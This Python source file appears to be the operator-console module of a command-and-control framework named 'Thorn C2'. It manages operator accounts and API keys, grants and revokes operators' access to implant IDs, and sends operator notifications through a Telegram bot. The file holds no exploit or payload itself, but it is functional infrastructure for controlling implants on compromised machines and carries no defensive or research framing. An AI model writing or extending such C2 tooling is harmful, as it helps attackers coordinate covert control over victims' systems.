"""UsersMixin — operator account management commands."""

import urllib.request, json as _json

from .ui import ok, err, info, warn, bold, cyan, grey, table
from .api import check, save_telegram, clear_telegram, load_telegram


def _telegram_send(bot_token: str, chat_id: str, text: str):
    """Send a Telegram message synchronously. Returns True on success, error string on failure."""
    try:
        data = _json.dumps({"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}).encode()
        req  = urllib.request.Request(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data=data, headers={"Content-Type": "application/json"}, method="POST",
        )
        resp = urllib.request.urlopen(req, timeout=10)
        body = _json.loads(resp.read())
        return True if body.get("ok") else body.get("description", "unknown error")
    except Exception as e:
        return str(e)


class UsersMixin:

    def do_users(self, arg):
        """users  —  List all operator accounts and their implant access"""
        s, url = self._session()
        if not s: return
        resp = check(s.get(f"{url}/api/users"))
        if not resp: return
        try:
            users = resp.json()
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        if not isinstance(users, list):
            err(f"Unexpected response format: {resp.text[:200]}")
            return
        if not users:
            info("No operator accounts yet. Use: useradd <username>")
            return
        rows = [
            [cyan(u['username']), ', '.join(u.get('imp_ids', [])) or grey('none')]
            for u in users
        ]
        table(rows, ["Username", "Implant IDs"], title=f"Operators  {grey(f'({len(users)})')}")

    def do_useradd(self, arg):
        """useradd <username>  —  Create a new operator account and print their API key"""
        username = arg.strip()
        if not username:
            err("Usage: useradd <username>")
            return
        s, url = self._session()
        if not s: return
        resp = check(s.post(f"{url}/api/users", json={"username": username}))
        if not resp: return
        try:
            data = resp.json()
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        if 'error' in data:
            err(data['error'])
            return
        ok(f"Operator created: {cyan(data['username'])}")
        info(f"API key (shown once): {bold(data['api_key'])}")
        info(f"Share with operator: config {url} {data['api_key']}")

    def do_grant(self, arg):
        """grant <username> <imp_id>  —  Give a user access to an implant ID"""
        parts = arg.split()
        if len(parts) != 2:
            err("Usage: grant <username> <imp_id>")
            return
        username, imp_id = parts
        s, url = self._session()
        if not s: return
        resp = check(s.post(f"{url}/api/users/{username}/implants", json={"imp_id": imp_id}))
        if not resp: return
        try:
            data = resp.json()
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        if 'error' in data:
            err(data['error'])
            return
        ok(f"{cyan(username)} granted access to implant {cyan(imp_id)}")

    def do_revoke(self, arg):
        """revoke <username> <imp_id>  —  Remove a user's access to an implant ID"""
        parts = arg.split()
        if len(parts) != 2:
            err("Usage: revoke <username> <imp_id>")
            return
        username, imp_id = parts
        s, url = self._session()
        if not s: return
        resp = check(s.delete(f"{url}/api/users/{username}/implants/{imp_id}"))
        if not resp: return
        try:
            data = resp.json()
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        if data.get('revoked'):
            ok(f"{cyan(username)} access to {cyan(imp_id)} revoked.")
        else:
            warn(f"No access entry found for {username} / {imp_id}")


    def do_telegram(self, arg):
        """telegram <bot_token> <chat_id>  |  telegram test  |  telegram off"""
        parts = arg.strip().split()
        sub   = parts[0].lower() if parts else ""

        if sub == "off":
            clear_telegram()
            ok("Telegram notifications disabled.")
            return

        if sub == "test":
            bot_token, chat_id = load_telegram()
            if not bot_token or not chat_id:
                err("No Telegram credentials saved — run: telegram <bot_token> <chat_id>")
                return
            result = _telegram_send(bot_token, chat_id, "🌑 *Thorn C2* — test notification")
            if result is True:
                ok("Test message sent successfully.")
            else:
                err(f"Telegram send failed: {result}")
            return

        if len(parts) != 2:
            err("Usage: telegram <bot_token> <chat_id>")
            info("       telegram test  — send a test message with saved credentials")
            info("       telegram off   — disable notifications")
            return

        bot_token, chat_id = parts
        save_telegram(bot_token, chat_id)
        result = _telegram_send(bot_token, chat_id, "🌑 *Thorn C2* — notifications enabled")
        if result is True:
            ok("Telegram notifications enabled — test message sent.")
        else:
            err(f"Credentials saved but test send failed: {result}")
            info("Check your bot token and chat ID.")

    def do_userdel(self, arg):
        """userdel <username>  —  Delete an operator account"""
        username = arg.strip()
        if not username:
            err("Usage: userdel <username>")
            return
        s, url = self._session()
        if not s: return
        resp = check(s.delete(f"{url}/api/users/{username}"))
        if not resp: return
        try:
            data = resp.json()
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        if data.get('deleted'):
            ok(f"Operator {cyan(username)} deleted.")
        else:
            warn(f"No operator found with username '{username}'")
